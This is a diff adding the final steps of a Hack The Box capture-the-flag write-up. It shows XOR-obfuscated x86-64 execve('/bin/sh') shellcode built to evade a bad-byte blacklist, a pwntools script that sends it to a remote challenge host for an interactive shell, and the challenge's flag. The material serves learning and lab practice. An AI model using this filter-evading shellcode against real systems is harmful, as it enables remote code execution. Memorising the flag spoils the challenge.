@@ -9,6 +9,7 @@
 2. Input bug which leads to direct code execution.
 3. Implement ret2shellcode attack.
 4. Craft custom shellcode to bypass bad bytes.
+5. Using XOR operation to hide `/bin/sh` strings.
 
 ## DESCRIPTION:
 
@@ -170,4 +171,94 @@ xor [rsp], rax
 ## [+] At this point KEY stored on the stack is XORed with the previously XORed strings.
 
 This operation resulting to "/bin/sh" strings.
+
+Now then stored it back to RDI.
+```
+
+14. Great! Seems we have the idea, now the problem is to identify which KEY should resulting us no NULL Bytes.
+15. Struggling enough to identify the correct key. Started by using `0xffffffffffffffff` but resulting to another bad bytes.
+16. So I bruteforced it all the way until I met this KEY `0x2a2a2a2a2a2a2a2a`.
+
+> FULL SHELLCODE
+
+```asm
+mov rax, 0x2a2a2a2a2a2a2a2a
+push rax
+
+mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
+xor [rsp], rax
+mov rdi, rsp
+
+push 0x0
+pop rsi
+push 0x0
+pop rdx
+
+push 0x3a
+pop rax
+add al, 0x1
+syscall
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ad612f74-612e-4815-8944-c49075486691)
+
+
+17. Great! We gained RCE.
+
+> FULL SCRIPT
+
+```py
+from pwn import *
+
+exe = './execute'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+# sh = process(exe)
+sh = remote('94.237.49.212', 45920)
+
+blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
+        
+shellcode = '''    
+mov rax, 0x2a2a2a2a2a2a2a2a
+push rax
+
+mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
+xor [rsp], rax
+mov rdi, rsp
+
+push 0x0
+pop rsi
+push 0x0
+pop rdx
+
+push 0x3a
+pop rax
+add al, 0x1
+syscall
+'''
+
+sc = asm(shellcode)
+for byte in sc:
+    if byte in blacklist:
+        print(f'BAD BYTE --> 0x{byte:02x}')
+        print(f'ASCII --> {chr(byte)}')
+
+sh.sendline(sc)
+sh.interactive()
+```
+
+> REMOTE TEST
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8e53a6d8-6564-4f6b-98bc-68d4d84c27d1)
+
+
+18. We've pwned it!
+
+## FLAG
+
+```
+HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}
 ```
